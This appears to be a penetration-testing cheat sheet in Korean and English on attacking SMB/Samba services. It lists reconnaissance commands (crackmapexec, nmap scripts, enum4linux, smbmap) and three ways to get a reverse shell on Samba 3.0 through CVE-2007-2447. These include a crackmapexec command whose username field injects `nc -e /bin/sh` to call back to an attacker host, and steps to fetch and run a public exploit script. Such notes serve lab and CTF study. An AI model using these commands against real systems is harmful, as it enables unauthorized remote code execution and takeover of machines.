SMB
#
## 1. Recon

`crackmapexec`
```
crackmapexec <protocol> <target(s)> -u username -p 'Admin!123@'
```
![image](https://user-images.githubusercontent.com/61821641/152250555-5266158b-ac0b-4b69-a2bf-8c196d48b077.png)
#
`nmap`
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.3
```
![image](https://user-images.githubusercontent.com/61821641/152250787-8d6e1948-4e57-4c26-a269-7f4799f20d70.png)
#
`enum4linux` --SMB 공유를 열거
```
enum4linux <option> ip
```
options

**TAG**            **FUNCTION**

\-U             get userlist  
\-M             get machine list  
\-N             get namelist dump (different from -U and-M)  
\-S             get sharelist  
\-P             get password policy information  
\-G             get group and member list

\-a             위의 모든 것(전체 기본 열거)

![image](https://user-images.githubusercontent.com/61821641/152262411-343389d4-7b2a-4bc2-ae32-02dd91ba816d.png)
![image](https://user-images.githubusercontent.com/61821641/152262564-11c48e44-4a4a-4741-99bd-f36da66c23d3.png)
![image](https://user-images.githubusercontent.com/61821641/152262280-4726a649-9081-4023-9552-57a65bf697c7.png)
![image](https://user-images.githubusercontent.com/61821641/152262476-631087c9-f841-41cb-a2f9-7127a95d7bc7.png)
![image](https://user-images.githubusercontent.com/61821641/152262522-ae1d8656-ffe6-4a79-b0f0-58880244560e.png)
#
`smbmap`

```
smbmap -H 10.10.10.3
```
![image](https://user-images.githubusercontent.com/61821641/152289995-1adb1396-c28d-4f2c-8f31-84b340e9c7ed.png)
#
## 2. Reverse shell

```
searchsploit samba 3.0
```
![image](https://user-images.githubusercontent.com/61821641/152251312-176345ec-e2a7-4c7c-8651-6bf2ec998bf4.png)

```
cat /usr/share/exploitdb/exploits/unix/remote/16320.rb
```

![image](https://user-images.githubusercontent.com/61821641/152253552-4cabe63e-d45f-4b1d-a136-95541e369e3d.png)

![image](https://user-images.githubusercontent.com/61821641/152253655-97482bce-b39d-4c5c-bdd8-89f18a30332e.png)

위의 익스플로잇으로 리버스 셸 따기

첫번째 방법 `crackmapexec`
```
crackmapexec smb --shares <RHOST> -u './=`nohup nc -e /bin/sh <LHOST> <LPORT>`' -p ''
```


두번째 방법 [CVE-2007-2447](https://github.com/amriunix/CVE-2007-2447)

`setup`
```
pip install --user pysmb
git clone https://github.com/amriunix/CVE-2007-2447.git
cd CVE-2007-2447
```

```
python3 usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>
```

세번째 방법 `metasploit`

![image](https://user-images.githubusercontent.com/61821641/152263387-2799f21b-491c-4ba0-9a28-3761787a6ec6.png)
![image](https://user-images.githubusercontent.com/61821641/152263486-f487bd28-e61b-491d-9bd1-3d34bcfeef81.png)
![image](https://user-images.githubusercontent.com/61821641/152263535-78b93c30-99a0-4bd8-b514-63a107fe6845.png)

#
## 3. Exploit

- [CVE-2017-7494](https://www.cvedetails.com/cve/CVE-2017-7494/)
- [CVE-2007-2447](https://github.com/amriunix/CVE-2007-2447)
#